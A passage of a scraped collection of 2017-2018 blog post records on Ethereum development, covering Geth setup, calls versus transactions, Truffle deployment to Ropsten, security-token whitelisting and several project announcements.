On: Creating Your Own Local Private Geth Node (Beginner Friendly)", "author_name": "Niharika Singh", "link": "https://hackernoon.com/hands-on-creating-your-own-local-private-geth-node-beginner-friendly-3d45902cc612?source=search_post", "post_date": "Dec 29, 2018", "readtime": "6 min read", "upvotes": "515", "content": "Hands On: Creating Your Own Local Private Geth Node (Beginner Friendly)Niharika SinghBlockedUnblockFollowFollowingDec 29, 2018Source: https://altcointoday.com/If you\u2019re new to the blockchain sphere and want to get a hands-on feel of this ground-breaking yet a-tad-bit arcane technology, this tutorial is for you.This will be a comprehensive step-by-step tutorial for you to get started with Ethereum blockchain. So, don\u2019t worry I will cover each and every step.Source: https://tenor.com/What will we\u00a0build?A local testnet Ethereum blockchain using Geth.Local: This blockchain will be running only on your computer (formally, node) locally.Testnet: This will not mine real Ethers. Only fake ones. It is perfect for testing dApps, or for just playing around.PrerequisitesMacOSHomebrew (Download link: https://brew.sh/)XCode (Get from AppStore)Setting Up Development EnvironmentStep 0: Download Geth using\u00a0HomebrewFire up your terminal and enter the following command. Make sure you already have Homebrew installed, otherwise this command will not work for you.$ brew tap ethereum/ethereumThis command will clone Ethereum repo into your Library folder on Mac.To install geth, run the following command:$ brew install ethereumViola, geth is intalled.Before going any further, let me clear what Geth\u00a0isgeth is the the command line interface for running a full ethereum node implemented in Go. You can mine real ether (if you\u2019re on mainnet), transfer funds between addresses, create smart contracts, make transactions, explore the chain, use Web3 etc.To know more, see this resource:ethereum/go-ethereumOfficial Go implementation of the Ethereum protocol - ethereum/go-ethereumgithub.com", "responses": ""}, {"title": "Calls vs. transactions in Ethereum smart contracts", "author_name": "Rob Hitchens", "link": "https://blog.b9lab.com/calls-vs-transactions-in-ethereum-smart-contracts-62d6b17d0bc2?source=search_post", "post_date": "Aug 30, 2018", "readtime": "5 min read", "upvotes": "141", "content": "Image credit: Eduardo\u00a0S\u00e1nchezCalls vs. transactions in Ethereum smart contractsWhat is the difference between a transaction and a\u00a0call?Rob HitchensBlockedUnblockFollowFollowingAug 30, 2018Among the most confusing topics in the world of Ethereum smart contracts is the difference between read-only calls and potentially state-changing transactions, and the various ways to implement each. This is partly because the word \u201ccall\u201d is overloaded and means too many different things in too many different contexts.It may be more cognitively useful to categorize the two modes of operation as \u201clocal\u201d and \u201cverified\u201d.Local vs.\u00a0verifiedThe Ethereum state is somewhat different from a typical database. The implications take some getting used to. Each node has a copy of the state, much like a replica, and each node independently verifies the authenticity of the state as the blocks arrive and transactions are processed locally. In this way, each node can know that its own copy of the state is legitimate.Local copies mean that a node can explore and inspect the state without any further assistance from the network. Nodes can even run contract functions to discover what would happen if the same inputs were actually sent to the network. Since the network is not even consulted during such local explorations, the network cannot possibly know about any attempted state change. Consequently, such operations are read-only, by definition.Callers can invoke any contract function on a local read-only basis with the call() method Web3 attaches to every contract function. This relies on local resources, and returns values sent by contract return statements. This is useful for \u201cdry-run\u201d, \u201cwhat if\u201d exercises. This is part of the gas cost estimation process, and this is the normal way to invoke read-only contract functions, a.k.a. \u201cgetters\u201d.Here\u2019s where it gets a little confusing, though.Contract authors can hard-code this behavior into contract functions using the keywords \u201cview\u201d and \u201cpure\u201d (in the past, \u201cconstant\u201d was used).view: Will read the state but will not change it.pure: Does not need access to the state and will not change it.Read-only invocations, whether hard-coded at the contract level or requested with the client-side \u201ccall()\u201d method, run much faster than transactions that require network verification. Still, it\u2019s important to keep in mind that the design is not optimized for application-specific performance and these fetch operations still may require considerable digging through the ever-growing blockchain state.Verified transactions that potentially change the state are sent to the network for verification. Consequently, senders don\u2019t receive return values. Instead, they receive a transaction hash and must wait for the transaction to be mined. Even then, the return results won\u2019t be returned and they must inspect the logs or call other functions to discover what happened.This causes a significant delay, the mining delay, that needs to be carefully accounted for in user interface design in order to create a responsive, informative and satisfying user experience\u200a\u2014\u200aat least if the users are expected to be human.What about messages?Another topic that can be a source of considerable confusion is the concept of an internal transaction, also known as a \u201cmessage\u201d. Contract functions can call other contract functions. Even if those are also potentially state-changing, the processing time can be thought of as roughly instantaneous. Normal intuitive ideas of performance such as processing time simply do not apply in a world where network nodes learn about completed transactions only after they are officially part of the past. And that\u2019s exactly what happens. Blocks arrive with ordered lists of transactions. In most important respects, those transactions can be considered completely executed regardless of complexity.Does a call that does not change the state cost\u00a0gas?Since read-only functions can and often are called from state-changing transactions, those functions in that case are executed by every verifying node. Each node will reach identical results, given the same initial state and the same transaction order. This is considerable redundant work, and therefore the normal constraints and gas accounting apply to read-only functions and read-only functions can run out of gas. While these read-only operations are often described as \u201cfree\u201d, they are not so if wrapped in a state-changing transaction because network resources are involved.In the case that the client initiates a read-only operation, then the gas is, effectively, returned. More precisely, the calling account\u2019s balance remains unchanged because the network was not even informed about the operation.Remember, a client can also invoke any function using the Web3\u00a0.call() method.In all three cases (view, pure and\u00a0.call()) the following apply:The contract will run on local CPU using a local copy of the blockchain (if needed at all) and there will be no network verification of anything.The EVM gas accounting applies and will be tracked. That is, if the contract function includes gas accounting (how much is left?) then it will work as normal in a \u201cdry run\u201d mode, using call(), for example. Same applies to \u201cout of gas\u201d situations. Sufficient gas must be supplied with the request.Since there is no network verification, there is no possibility of a state change. This includes the result that ether spent to supply gas is, effectively, returned. More precisely, it was never really sent because the network wasn\u2019t informed.Hopefully this post provides some clarity about what\u2019s going on, but the best way to learn is by doing.I invite you to try executing calls and transactions yourself in the online Ethereum Developer Course I teach with my colleagues at B9lab.", "responses": "1"}, {"title": "Latest Updates: New Language Announcements and Updated Beta\u00a0Process", "author_name": "Codewars", "link": "https://medium.com/@Codewars/latest-updates-new-language-announcements-and-updated-beta-process-a025dceed4eb?source=search_post", "post_date": "Oct 20, 2017", "readtime": "3 min read", "upvotes": "65", "content": "Latest Updates: New Language Announcements and Updated Beta\u00a0ProcessCodewarsBlockedUnblockFollowFollowingOct 20, 2017New LanguagesFor about a month now we have been running some new languages in beta that we want to officially announce.SolidityFor those interesting in cryptocurrencies (and you should be, it\u2019s the future!) we have added Solidity to the platform. Solidity is a language used by Ethereum and other blockchains to develop smart contracts. If you don\u2019t know what smart contracts are, check them out\u200a\u2014\u200awe think they are pretty great.There are already a few kata available, built just for Solidity, that will help you start to get your feet wet. Check these out:Smart Contracts Introduction: Gift CoinRock, Paper, Scissors, Smart Contractweb3 PackageSpeaking of Ethereum/cryptocurrencies, we have also updated our Node images to contain related packages. Here is a kata that demonstrates how to work with web3.ScalaScala is a JVM based language:Object-Oriented Meets Functional. Have the best of both worlds. Construct elegant class hierarchies for maximum code reuse and extensibility, implement their behavior using higher-order functions. Or anything in-between.A few kata have already been translated into Scala. Here is one to get you started.GroovyGroovy is a JVM based language:Groovy is a powerful, optionally typed and dynamic language, with static-typing and static compilation capabilities, for the Java platform aimed at improving developer productivity thanks to a concise, familiar and easy to learn syntax. It integrates smoothly with any Java program, and immediately delivers to your application powerful features, including scripting capabilities, Domain-Specific Language authoring, runtime and compile-time meta-programming and functional programming.A number of kata have also been translated into Groovy. Here is one of the easier ones.KotlinKotlin is another JVM language. It is commonly used for Android development.A statically typed programming language for modern multi-platform applications.There are already a Kotlin specific kata series out of beta to help get you started:Tricky Kotlin #0: extension constructorTricky Kotlin #1: invoke a stringTricky Kotlin #2: three fundamental functionsTricky Kotlin #3: define a function", "responses": ""}, {"title": "Developer Updates and NPM\u00a0Package", "author_name": "Ink Protocol", "link": "https://medium.com/ink-protocol/developer-updates-and-npm-package-3f57e272728e?source=search_post", "post_date": "Feb 1, 2018", "readtime": "", "upvotes": "202", "content": "Developer Updates and NPM\u00a0PackageInk ProtocolBlockedUnblockFollowFollowingFeb 1, 2018Hi everyone! The tech team has been hard at work, and we wanted to send out a few quick updates for everyone interested in developing marketplaces, apps or services using Ink Protocol.NPM PackageWe recently released our NPM package, which makes it easy to start working with our smart contract. We use this package internally for our Listia integration as well. Check it out!ink-protocolDecentralized reputation and payments for peer-to-peer marketplaceswww.npmjs.comTo install, just typenpm install ink-protocolLatest Smart\u00a0ContractOur Ink Protocol contract has undergone a few changes, and the latest one is available on Testnet using the link below. As always, do reach out directly if you want help using it or building on top of it. We will be deploying the Mainnet version soon, so stay tuned!Ethereum Account 0xB03b5ad79e59dc60974021059C85D3BC397C8EDa InfoContract Source Code Copy Find Similiar Contracts pragma solidity ^0.4.18; // File: contracts/InkMediator.sol interface\u2026rinkeby.etherscan.ioFull Source\u00a0CodeAll of our Ink Protocol related source code and docs are available on Github.InkProtocol/contractscontracts - The Ink Protocol Ethereum Smart Contractgithub.com", "responses": ""}, {"title": "Security token code and the future of\u00a0R-token", "author_name": "Andy Singleton", "link": "https://hackernoon.com/security-token-code-and-the-future-of-r-token-a7c70b50421a?source=search_post", "post_date": "Sep 5, 2018", "readtime": "7 min read", "upvotes": "104", "content": "Security token code and the future of\u00a0R-tokenAndy SingletonBlockedUnblockFollowFollowingSep 5, 2018If you want to issue a tokenized or \u201cprogrammable\u201d security, you will need some code to program. There are an increasing number of ERC20 token formats to handle securities, including ST20 from Polymath, R-token from Harbor, and DS from Securitize.io. I have heard rumors that Tokensoft and New Alchemy are preparing their own token formats. I suspect they are adding to the noise because it is hard to find code that is truly open source and useful for advisors and issuers that want to design tokenized securities. Each vendor is trying to build its own walled garden, not a globally unified security market. It\u2019s time to start consolidating the formats, and opening up participation. In this article, we will cover the basic requirements for a security token. We will also describe our own work to improve R-token, open it up, merge it with ST20, and connect it to DS.Harbor introduced their idea for a simple and upgradeable whitelist token last January as \u201cR-token\u201d. We adopted it and we have built it into a sophisticated machine. However, Harbor appears to have abandoned it. Their last code update was on April 5, and they have not responded to calls or emails during the past few months.We have filled out R-token and proposed some simplifications and improvements, and added those capabilities to ST20. The next step is to merge that work with other formats to make a more standard and more open foundation.Security tokens have unique requirementsA security token has basic requirements that are different from the requirements of a cryptocurrency.Whitelisting of qualified investorsAll of the tokens that I describe here can do whitelisting, which means that they keep a list of blockchain addresses that represent investors that are qualified to receive a security. Then, they prevent the transfer of the token to anyone that is not on the list.The most basic investor qualification function is KYC/AML. In the regulated world, almost every investor needs to be qualified with KYC/AML before you send them a security. \u201cKnow Your Customer\u201d means that you know who the investor is, and it\u2019s not a bad guy, a tax evader, or someone under political sanctions. \u201cAnti Money Laundering\u201d means that you know approximately where they got the money to buy a security, and it\u2019s not from illegal activity. You can put people on a whitelist after you make these checks.In the US and many other jurisdictions, investors need an additional level of qualification before you can sell them private securities. Private securities are any securities without public market reporting, which is expensive. Governments allow you to sell to investors without the expensive public market reports and disclosure, but they often only allow you to sell to investors that are \u201csophisticated\u201d or \u201cprofessional\u201d enough to do their own analysis and cover their own losses. In the US they can meet qualifications like accredited (they have $1M to invest), Qualified ($5M) or QIB ($100M).A lot of securities won\u2019t need \u201csophisticated\u201d investor qualification, but they will almost all need KYC/AML qualification. The US government has been an enthusiastic promoter of KYC/AML rules, and through their control of the dollar-based money transfer system, they have been able to push for KYC/AML rules in almost every jurisdiction.It\u2019s possible to make sure that your buyers have been qualified if you only sell through centralized exchanges that check their qualifications. That\u2019s how the current public exchange system works. However, this doesn\u2019t actually cover the use case for tokenized securities, which are also sold directly by the issuer, in portals, exchanged peer to peer or \u201cOTC\u201d, and moved between exchanges. To get that type of mobility, you need a whitelist, and you need to be able to add qualified exchange customers to the whitelist when you transfer a security out of an exchange. So, whitelist token formats are important even to exchanges with good internal transfer agents.Transfer rulesIf you are selling a private security, you will need to enforce transfer rules so that you send only to qualified investors, according to the different rules of various jurisdictions. You probably also want to enforce lockups, such as the one year lockup for private securities sold in the US. You may have other rules that are typically part of a \u201csubscription agreement\u201d signed by a shareholder. One of the benefits of a tokenized security is that we don\u2019t have to pass around paper and sign subscription agreements. Instead, we program the rules directly into the security. Then we can exchange.Transfer rules will almost always be required because the majority of security tokens are private securities, or they are private SOMEWHERE in the world where they have investors. Securities that qualify as a public security in Malta or the UK will usually need to be handled as private securities in the US. Keeping track of these rules will prevent you from getting a call from a regulator you don\u2019t want to deal with.The tokens mentioned in this article are all programmed to run on Ethereum. However, we can use the same rules and whitelists for other chains and ledgers that are faster or simpler. For example, Stellar does not allow tokens to carry their own code. However, they are adding a feature which can require that an issuer sign off on every transfer using a type of centralized oracle. We can use the same whitelists and rules to do that.Security replacement and other governanceWith a cryptocurrency, if you lose the key, you lose the asset. Securities don\u2019t work that way. If grandma buys a security, and dies without leaving a key, you still owe the securities to her estate. As the issuer, you need a way to essentially replace the share certificate by grabbing the old tokens and moving them to a new holder. There are other cases where you may need to force a transfer, such as the case where 90% of investors have accepted a tender offer, and you have the right to force the other 10% into the deal.To do this, you need a governance process, such as the multi-sig governance that we have programmed into our registry. You probably need a workflow for issuing more securities, which companies do all of the time after board approval, and for distributing securities or payments.Real name\u00a0registryIf you are selling stock, then you are required to keep a list of shareholders. You need to be able to track them down to verify regulatory compliance, and you need to be able to contact them so you can provide them with their shareholder rights. Essentially, you need to be able to go back to the party that qualified an investor and put them on the whitelist, and get more information for your registry. Our token implementations include a whitelisting system and registry to do this.UpgradesDuring the multi-year life of a security, the rules change. The sets of qualified investors change. You may want to provide new features for compatibility with emerging exchanges. You may want to fix your implementation. It\u2019s very important to be able to attach updated code to your existing token.A lot of the token code that we looked at fails to meet the requirement for upgradeability.R-Token upgradesThe original R-token concept was very simple. R-Token is a permissioned token on the Ethereum blockchain, enabling token transfers to occur if and only if they are approved by an on-chain Regulator Service (a script). The ServiceRegistry is a mechanism to upgrade the regulator as rules change over time. We liked the upgrade feature.Original R-Token format with Service\u00a0RegistryWe have made a number of modifications to make it easier to upgrade the rules, settings, and whitelists:Revised R-Token with reusable whitelistsService Registry is unnecessary component that costs additional fees. The pointer to the current Regulator can be updated in token itself.Settings Storage holds values for managing token transfers like transfer lockup, allow new shareholders, initial offering end date or managing whitelists. It is also replaceable. You can update these settings independent from updating the code.We filled in the rules for a US Reg D and global Reg S offering, and various other private market rules.We added reusable whitelists, which can be used with other token formats.Other token\u00a0formatsYou can add these scripts to an ST20 token by replacing the \u201cTransfer Manager\u201d. This will upgrade the ST20 token that Polymath is currently generating to include upgraded whitelists and rules. It is a big improvement from the very crude whitelist in their initial release. It will also add the registry capabilities.I think that Polymath has done a pretty good job in offering their ST20 format as a standard that issuers and exchanges can build on. That is what we are doing here. However, much of their effort is going into the Polymath \u201cplatform\u201d, which is a portal and a more complicated set of code that manages the process of an initial sale, and encourages you to use their POLY token. Engaging with this platform is difficult, and most people will skip it. Most advisors have their own sales channel. The POLY tokens are annoying. Polymath doesn\u2019t return messages or have an established path for code contribution or plugin contribution. I find this to be true even though I have a partnership agreement with them. I look forward to working with them on a more open plugin process.Securitize.io is currently rolling out tokens with their new DS format, whitelists, and registry. Unfortunately, this is currently a closed system that requires you to buy all of the token programming from Securitize, and qualify investors through their portal. The DS architecture is pretty similar to our implementation. I offered my code to them, but they decided to roll their own. We can unify these efforts for exchanges by making a code- compatible API for the registry.I have sent messages to Tokensoft and New Alchemy, and not heard back.Developing a global\u00a0marketLet us know how we can share code or accept contributions. Let us know how we can include your whitelists and customer lists. We can all be engaged in helping issuers and exchanges ramp up a truly global security market.", "responses": "4"}, {"title": "Ethereum \u00d0Apps Programming Distilled\u200a\u2014\u200aPart\u00a05", "author_name": "Marco Bellinaso", "link": "https://medium.com/@mbellinaso/ethereum-dapps-programming-distilled-publishing-ropsten-testnet-mainnet-infura-f5b391c80e60?source=search_post", "post_date": "Mar 6, 2018", "readtime": "8 min read", "upvotes": "55", "content": "Ethereum \u00d0Apps Programming Distilled\u200a\u2014\u200aPart\u00a05Publishing a DApp: using Truffle to deploy on either the Ropsten testnet or on the mainnet, and deploying the frontend on GitHub Pages with CloudFront on\u00a0top.Marco BellinasoBlockedUnblockFollowFollowingMar 6, 2018This is a multi-part article. Here are the links to the other parts:Part 1: What is a blockchain and how does it work?Part 2: What\u2019s special about Ethereum, and how to write a Smart Contract with Solidity?Part 3: Deploying the backend of a DApp: Geth, Mist and TrufflePart 4: Creating and deploying the frontend with HTML, JS, Web3 and MetaMaskSo far we\u2019ve worked with a local private blockchain, and a frontend running on a local webserver. Let\u2019s see what it takes to publish it \u201clive\u201d, so that it\u2019s usable by other people.BackendPublishing a Smart Contract to a public blockchain is the same regardless of whether it\u2019s a testnet (I used Ropsten) or mainnet (besides the price of course\u200a\u2014\u200ait\u2019s free on testnet, it\u2019s not free on mainnet). The \u201cpure\u201d approach would be to use the geth client to download the entire blockchain on your machine, then deploy to it (using geth, Mist or Truffle) and have the transaction broadcasted from your machine to the closest nodes and then to the entire network. I gave it a try but, honestly, I failed: geth kept finding only 1 or 2 nodes to downloaded data from, they dropped very often, and for that reason or unknown others geth was always getting stuck indefinitely. After a Saturday of attempts I gave up and looked at alternatives.Turns out there is a very easy one, which is sending the transactions to the public nodes hosted by Infura.io rather than using a local node! Just sign up on their website for free and you\u2019ll be given the url of a node that you can use rather than using localhost. You save time and plenty of space on your hdd. Once you have that, install the truffle-hdwallet-provider library on your machine, and finally edit the truffle.js file as follows to configure the Ropsten network (see here for a full step-by-step guide):var HDWalletProvider = require(\"truffle-hdwallet-provider\");var Web3 = require(\"web3\");var web3 = new Web3();var mnemonicRopsten = \"...find these on the MetaMask popup...\";module.exports = {  networks: {   development: {      host: \"localhost\",      port: 9545,      network_id: \"*\" // Match any network id    },    ropsten: {      provider: function() {        return new HDWalletProvider(mnemonicRopsten,            \"https://ropsten.infura.io/[your token here]\")      },      network_id: 3,      gas: 4600000,      gasPrice: web3.toWei(\"20\", \"gwei\")    }     }};Now execute \u201ctruffle migrate\u200a\u2014\u200anetwork ropsten\u201d from the command-line, and that will hopefully deploy your contract on the Ropsten testnet, giving you a feedback similar to the following:Using network 'ropsten'.Running migration: 1_initial_migration.js  Deploying Migrations...  ... 0x6cd4f49d0c04a3d976c63d04c766ba50f9813a5cd72265e4a4adf527d04d4791  Migrations: 0x7076dff8039206819f0c0ab7158457e8ee615ae5Saving successful migration to network...  ... 0xa8eb0ac1f5967338744a491eb74d20fbc652e49b112b30c66a48b43462ca0778Saving artifacts...Running migration: 2_deploy_contracts.js  Deploying MessageStorage...  ... 0x338eecf2260437d7aa45dc348dc8e675aea1d132ba18c94af0a2fa34bc34f766  MessageStorage: 0x765c19b73379dec5d851f66d937e053c865f9960Saving successful migration to network...  ... 0xda762551e6931e1d34e85418d3b467da4aa22501875ec3302a6d6e2aad680decSaving artifacts...The address in bold is the transaction that actually deployed the contract on the Ropsten testnet, which you can search on ropsten.etherscan.io to see all details about it. For example it\u2019s very interesting to see that the transaction costed 0.03454534 ETH\u2026which is 0 USD on the testnet, but would have been around 30$ on the mainnet, at the current valuation of 1ETH=865USD. That is for a contract of around 200 lines + 800 lines for helper libraries; the cost would of course go up according to how big your contract and dependencies are! That is one of the reasons why you\u2019ll really want to deploy when you\u2019re confident that everything is ok, there are no bugs, etc.Note: if you get \u201cout of gas\u201d errors when trying to run the migration, check from MetaMask that the first account in the Ropsten network has some Ether (HDWalletProvider uses the first one, you can\u2019t make it use a different one). If you need some, just click \u201cBuy\u201d from MetaMask and it will send you to a webpage where you can get some from a free \u201cfaucet\u201d.As said, publishing to the mainnet would follow the same approach: you\u2019d just use a different url from Infura for the truffle.js file, and you\u2019d need some real Ether in your account.FrontendRunning Truffle to deploy on the public blockchain does of course create a new ABI file (eg.\u00a0../build/contracts/MessageStorage.json), with the address of where the contract is available on that network. Just include that file in your project, by replacing the one used during development that was pointing to the private chain, and you\u2019re done. You can test the frontend on the same http://localhost:3000 url that you\u2019ve used before, to ensure everything is still ok, and then finally move it all online on an externally-reachable webserver.That only thing I had to fix was about showing a \u201cloading overlay\u201d after sending a transaction to create a message, and hiding it when that completed. Transactions sent to the private blockchain are instantaneous so I hadn\u2019t noticed I needed that. Transacting on Ropsten has instead a latency of quite a few seconds, which makes it necessary to show some feedback to the user in the meantime. This is why a real decentralised testnet is much more realistic than a completely private setup.Since my app\u2019s frontend is just static html and js files, I didn\u2019t need a hosting that supports Node.js, PHP, ASP.NET or any other server-side framework. Therefore, the free GitHub Pages is perfectly capable of hosting my frontend. The nice thing about this option (besides the price being zero) is that to publish a new version of the files you just do a git commit/push.If you deploy the contract only on the mainnet, or maybe only on the Ropsten testnet while it\u2019s in beta, you\u2019ll want to write a few lines of javascript to check that the user is on the correct network, otherwise the page wouldn\u2019t work because the contract wouldn\u2019t be found. Here\u2019s a snippet that logs the current network and displays an error if the user is not on Ropsten:web3.version.getNetwork((err, netId) => {  switch (netId) {    case '1':      console.log('This is mainnet');      break;    case '2':      console.log('This is the deprecated Morden test network.');      break;    case '3':      console.log('This is the ropsten test network.');      break;    default:      console.log('This is an unknown/private network.');  }  if (netId != '3') {    alert('You must be on the Ropsten testnet!');  }});I put CloudFlare in front of my files on GitHub Pages, as explained here very clearly by Karan Thakkar, to have free SSL, url rewrites (eg: remove www. from www.msgblocks.com/something), CDN caching and html/css/js minification (in case you don\u2019t do it as part of your build process). In order to have your own domain, just purchase it on Namecheap or from somewhere else, make it point to the CloudFlare\u2019s nameservers, let CloudFlare automatically set up the DNS records you need, and do the other few steps explained in the article above to configure redirects and https. It takes like 10 minutes to set up and it\u2019s free\u2026can\u2019t really ask for more!Your app would now be public, running on a real decentralised blockchain with a web frontend on your own domain, with a CDN (content delivery network) to speed up the page load and protected by SSL.Sounds good\u2026how do I start my app\u00a0now?This is what I\u2019d do if I had to start from scratch now:Read this article about creating, deploying and debugging a Smart Contract with Truffle. You can set up the environment and follow the guide step by step in one hour or so. The sample contract is of course super simple, but it shows plenty of concepts in practice, and it\u2019s very beneficial.Install the Ganache GUI to have a nicer and easier way to see what happens on your private blockchain as you keep doing sample transactions with the contract developed in #1.Read this other article, also by ConsenSys (like everything about Truffle), about creating a more complex Smart Contract but also its web-based frontend with HTML, JS, MetaMask.Do the interactive CryptoZombies course, created by Matthew Campbell and the Loom Network team. This is really an incredible tool to start from zero with Solidity, and learn how to create a game similar to the popular CryptoKitties step-by-step, with plenty of useful notes and tips along the way. Complete all the lessons and really write the code in their editor, it\u2019s very worth it!At this point you should know more than enough to start your own original idea! Enjoy!ConclusionsWhile it\u2019s no longer early days to become a cryptocurrency investor\u2026it\u2019s definitely very early days to be a blockchain developer and create something new and interesting. If you start now\u200a\u2014\u200aand even if you only play with simple things\u200a\u2014\u200ayou\u2019ll have an advantage in the future when the technology becomes more mature and there will be frameworks and tools that abstract complexities and provide workarounds for the current constraints, because you\u2019ll have a better understanding of how things work behind the scenes.Starting out is not difficult, and it\u2019s something that\u2019s probably quite different from everything that you\u2019ve worked on so far, which should make it fun and interesting\u2026so why not?Other ResourcesIn addition to all the resources and articles linked above, here are some more resources that I suggest to check out:How does Ethereum work, anyway? by Preethi Kasireddy, gives a deeper and more visual overview of many concepts of how this blockchain works under the hood.Ethereum Smart Contract Development Best Practices: the title says it all.ETH Guide by chris dannen provides plenty of links to tools, articles and various other resources, grouped by category.Token Economy is a weekly newsletter written by Stefano Bernardi and Yannick Roux that covers more the financial side of things (new projects, market analysis, rumours, technology improvements in the different blockchains,\u00a0\u2026), but it\u2019s a great resource to see what\u2019s happening in the crypto world as a whole. There\u2019s even too much to follow unless this becomes your priority, but the good thing is that for every article they link they provide a summary and commentary directly in the newsletter\u2026so even reading just that might be enough to get a high-level understanding of what\u2019s new.Getting Up to Speed on Ethereum by Matt Condon: it talks about some of the things explain in this article as well, plus it gives a quick overview of many other technologies in the ecosystem, such as tokens, ETHPM, the different programming languages (even if you can care about just Solidity at the moment), DAOs, Aragon, IPFS, FileCoin, Augur, Gnosis, Golem, 0xProject, Bancor, Oraclize, BTCRelay, Open Zeppelin, ENS,\u00a0\u2026 (yes, I agree, there are too many things to study!\u00a0:)", "responses": "1"}, {"title": "Global Virtual Blockchain Hackathon: Challenge From BANKEX Foundation", "author_name": "BANKEX", "link": "https://blog.bankex.org/global-virtual-blockchain-hackathon-challenge-from-bankex-foundation-dc8c7fa4c5d5?source=search_post", "post_date": "Jul 5, 2018", "readtime": "3 min read", "upvotes": "739", "content": "Global Virtual Blockchain Hackathon: Challenge From BANKEX FoundationBANKEXBlockedUnblockFollowFollowingJul 5, 2018BANKEX Foundation has created a challenge as a part of Hack.Summit(\u201cBlockchain\u201d)\u200a\u2014\u200aa global, virtual hackathon hosted by Deconetand Hack VC that will take place from July 6th-8th, 2018.ChallengeCheck out BANKEX Foundation\u2019s full challenge description here (create an account in Deconet to view it). Additional resources and judging criteria are also provided.BANKEX Foundation has created 4 product challenges for hackathon participants, but they welcome you to create a different solution based on their technology and will value it just the same and reward accordingly.#1 web3swift based projects\u200a\u2014\u200a5000\u00a0BKXLately, blockchain technology is quickly gaining positions in the mobile devices market. This challenge dares you to create an innovative solution with the help of the fastest and the most popular native mobile library that works with Ethereum network. Web3swift allows you to work with test and main Ethereum networks. Here are the key advantages of the library that you should use:Complete functionality on pure Swift without unnecessary dependenciesTruly open-source development supported by the communitySecurity comparable to a hard walletEase of use: you don\u2019t need to be a blockchain expert to work with itweb3swift Challenges\u00a0:Create a mobile app that uses web3swift library. It can even be a crypto kitties client!#2 Proof of asset protocol\u200a\u2014\u200a5000\u00a0BKXTest your skills using our new Proof-of-Asset protocol that merges real-world assets with the blockchain technology. Smart contracts on Proof-of-Asset protocol are designed to be scalable on a significant amount of users and can be applied in a wide range of products. Here are some useful resources that you can check out:Proof-of-asset Challenges\u00a0: Create an application that uses proof-of-asset smart contracts library. It can be anything from the list below or something else you come up with: we only give some ideas for the inspiration:An app that implements asset management by voting. For example, we have a product and a list of suppliers. We use the voting system to decide from whom to order the product.A sample app that tokenizes subscription to some application or service (API).If you are a designer, we will be glad to see different descriptions of the business scenario and infographics for different asset types, for example, a visualization for house construction or water shipment. These infographics must be connected to a smart contract of asset tokenization.#3 Plasma\u200a\u2014\u200a5000\u00a0BKXThe insufficient scalability of the Ethereum network is one of the most important problems of dapps, since it prevents from using them to their full potential. BANKEX Plasma solves this problem by speeding Ethereum up to 10000 transactions per second. From the technical point of view, Plasma blockchain is just another blockchain that can be efficiently settled to a parent Ethereum chain and is well protected from the misbehavior of both Plasma operator and Plasma blockchain participants by a smart contract on the Ethereum network.Plasma Challenges\u00a0: The goal is to use plasma in your project. BANKEX appreciates any ideas where using plasma is applicable. That can be an application that faced with ethereum scalability and gas price issues. As a start point have a look at their Plasma ETH exchange repository and deployed demo app. Further, check the API documentation, there you will also find the address of the deployed plasma servers.#4 CTF\u200a\u2014\u200aCapture the Flag\u200a\u2014\u200a5000BKX:Bonus challenge is for individual hackers, bounty hunters and vulnerability experts. BANKEX is holding a smart contracts security competition. Blockchain development is linked with security audit. So, if you want to be a good developer, you need to understand basic (but not only) vulnerabilities. You can join that competition on their CTF challenge site.Good luck!", "responses": ""}, {"title": "The SpankChain Product\u00a0Roadmap", "author_name": "SpankChain", "link": "https://medium.com/spankchain/the-spankchain-roadmap-8b41a07d2524?source=search_post", "post_date": "Oct 12, 2017", "readtime": "2 min read", "upvotes": "280", "content": "The SpankChain Product\u00a0RoadmapOur plan to upend the adult entertainment industrySpankChainBlockedUnblockFollowFollowingOct 12, 2017Last week we shared our first development update, highlighting our state channel auction technology developed for our upcoming token sale.This week, we are excited to share our current product roadmap, laying out the path we plan to take to liberate the adult entertainment industry from outdated payment processing technology, poor privacy practices, outrageous fees, and rent-seeking middlemen.Below we have mapped out our roll out strategy, visualizing our expected areas of focus on a quarter by quarter basis for the next two years. This map will be presented in further detail in our whitepaper next week and on our website.See the full document\u00a0hereAs you may have noticed, state channel technology plays a large role in our vision. We believe that payment channels are a necessity for broad adoption of cryptocurrencies throughout the world and that porn is the perfect avenue to bring them to the masses.Throughout history, the adult entertainment industry has been the catalyst for numerous technological advancements. Despite the innovations it has spurred, the industry\u2019s employees are still exposed to draconian working conditions, primarily due to a lack of access to tools that would allow them to safely and securely manage their own business interests. With SpankChain we aim to turn the tables, empowering entertainers with a platform which can handle everything from distribution, to payments, to building an engaged community of followers.We believe in a sex positive future and maintaining the highest standards of privacy and security for sex workers and their clients. Join us on Discord to learn more about how SpankChain will bring these values to the world and how to participate in our upcoming token sale.", "responses": ""}, {"title": "Solidified to Become the Official Audit Partner of\u00a0Polymath", "author_name": "Polymath", "link": "https://blog.polymath.network/solidified-to-become-the-official-audit-partner-of-polymath-4b7f92164bba?source=search_post", "post_date": "Oct 18, 2018", "readtime": "3 min read", "upvotes": "258", "content": "Solidified to Become the Official Audit Partner of\u00a0PolymathPolymathBlockedUnblockFollowFollowingOct 18, 2018October 18, 2018\u200a\u2014\u200aToronto & Solidified HQ\u200a\u2014\u200aPolymath and Solidified are pleased to announce a partnership that will see Solidified as Polymath\u2019s Official Audit Partner. The two have been working closely together, and will continue working closely together, to ensure the security of Polymath\u2019s smart contracts and on-chain protocol.\u201cWe are honored and excited to be selected as Polymath\u2019s official auditor,\u201d said Eduard Kotysh, Founder and CEO of Solidified. \u201cThe technical team at Polymath truly understands the importance and multi-tiered nature of blockchain security and always seeks to use the best methods to protect their smart contracts. As one of our earliest clients, we\u2019re proud to see how much Polymath has grown, how accurately they have predicted the move to security tokens and become the leader in this space. We are looking forward to a long-term relationship and providing the best in class protection for the Polymath platform.\u201dSolidified Team\u201cSecurity is a critical concern of any organisation building an on-chain protocol,\u201d said Adam Dossa, Director of Technology at Polymath. \u201cWhen combined with securities and mechanisms that hold and transfer digital assets this concern becomes paramount. At Polymath we\u2019ve always taken a multi-faceted approach to this challenge, including commissioning multiple external audits for our Solidity code, running public and private bug bounties, and a strict, enforced, review process internally on code changes. We are truly excited to be building a long term relationship with Solidified which provides a comprehensive auditing process, leveraging their large community of thought leaders and domain experts, as well as an innovative bug bounty process.\u201dPolymath Team", "responses": ""}, {"title": "Developing with Polymath: Using web3 (Part\u00a01)", "author_name": "Shannon Clarke", "link": 